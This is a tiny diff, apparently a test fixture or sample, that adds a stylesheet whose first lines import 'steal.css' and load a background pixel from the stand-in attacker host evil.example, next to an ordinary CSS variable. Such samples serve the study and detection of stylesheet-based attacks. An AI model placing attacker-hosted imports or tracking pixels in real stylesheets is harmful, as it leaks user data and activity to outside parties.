@@ -1,0 +1,7 @@
+@import url('https://evil.example/steal.css');
+.card {
+  background: url(https://evil.example/pixel.png);
+}
+:root {
+  --gl-radius-card: 2px;
+}
